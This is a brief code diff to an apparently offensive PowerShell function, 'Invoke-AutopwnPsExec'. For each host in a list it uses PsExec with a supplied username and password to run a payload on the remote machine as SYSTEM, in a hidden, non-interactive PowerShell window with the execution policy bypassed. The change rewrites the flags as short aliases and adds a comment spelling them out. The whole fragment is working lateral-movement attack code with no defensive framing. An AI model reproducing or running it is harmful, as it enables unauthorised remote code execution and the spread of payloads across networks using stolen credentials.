@@ -27,7 +27,8 @@ function Invoke-AutopwnPsExec {
     else {
         foreach ($Box in $Hosts) {
             Write-Host "Exploiting host $Box"
-            .\PsExec64.exe -s -d \\$Box -r $SvcName -u $Username -p $Password powershell.exe -NoI -NoP -WindowStyle Hidden -C "$Payload"
+            # Powershell -NonInteractive -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command
+            .\PsExec64.exe -s -d \\$Box -r $SvcName -u $Username -p $Password powershell.exe -NonI -NoP -W 1 -Ep Bypass -C {$Payload}
         }
     }
 }
